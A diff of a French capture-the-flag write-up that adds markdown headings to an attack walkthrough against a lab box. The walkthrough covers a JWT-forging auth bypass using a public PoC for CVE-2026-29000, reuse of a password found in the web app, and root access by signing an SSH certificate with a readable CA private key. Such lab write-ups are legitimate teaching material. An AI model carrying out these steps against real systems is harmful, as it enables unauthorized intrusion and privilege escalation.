@@ -3,7 +3,7 @@
 ### Difficulty: Medium
 ### IP: 10.129.244.220
 
-Reconnaissance
+# Reconnaissance
 ```nmap -sC -sV 10.129.244.220```
 Ports ouverts :
 
@@ -15,7 +15,7 @@ google -> CVE-2026-29000 poc -> https://github.com/alihussainzada/CVE-2026-29000
 
 git clone du PoC , analyse du code, on à besoin de récupérer le jwks public pour forger notre jwt malveillant et bypass l'auth.
 
-Enumération Web (port 8080)
+# Enumération Web (port 8080)
 Le serveur redirige vers /login. En lisant le fichier JavaScript statique /static/js/app.js, on découvre l'architecture de l'application et ses endpoints :
 
 POST /api/auth/login — authentification
@@ -44,7 +44,7 @@ Token forgé injecté via la console du navigateur :
 ```window.location.href = '/dashboard';```
 Accès admin obtenu.
 
-Shell Initial — svc-deploy
+# Shell Initial — svc-deploy
 
 En naviguant sur la webapp nous voyons un onglet settings dans lequel on voit un panel
 security contenant un password : D3pl0y_$$H_Now42!
@@ -57,7 +57,7 @@ User flag : ```cat /home/svc-deploy/user.txt```
 
 premier flag obtenu !
 
-Privilege Escalation — SSH CA Key Abuse
+# Privilege Escalation — SSH CA Key Abuse
 Énumération avec LinPEAS. Findings critiques :
 
 1. L'utilisateur svc-deploy est membre du groupe deployers :
@@ -72,17 +72,17 @@ TrustedUserCAKeys /opt/principal/ssh/ca.pub
 PermitRootLogin prohibit-password
 PermitRootLogin prohibit-password autorise root par certificat (pas par mot de passe), ce qui valide le vecteur.
 
-Exploitation
-# Récupérer la clé CA
+# Exploitation
+## Récupérer la clé CA
 ```cat /opt/principal/ssh/ca > /tmp/ca && chmod 600 /tmp/ca```
 
-# Générer une paire de clés
+## Générer une paire de clés
 ```ssh-keygen -f /tmp/id_root -N ""```
 
-# Signer un certificat pour root valable 1h
+## Signer un certificat pour root valable 1h
 ```ssh-keygen -s /tmp/ca -I root_cert -n root -V +1h /tmp/id_root.pub```
 
-# Connexion root par certificat
+## Connexion root par certificat
 ```ssh -i /tmp/id_root -o CertificateFile=/tmp/id_root-cert.pub root@10.129.244.220```
 Root flag : ```cat /root/root.txt```
 
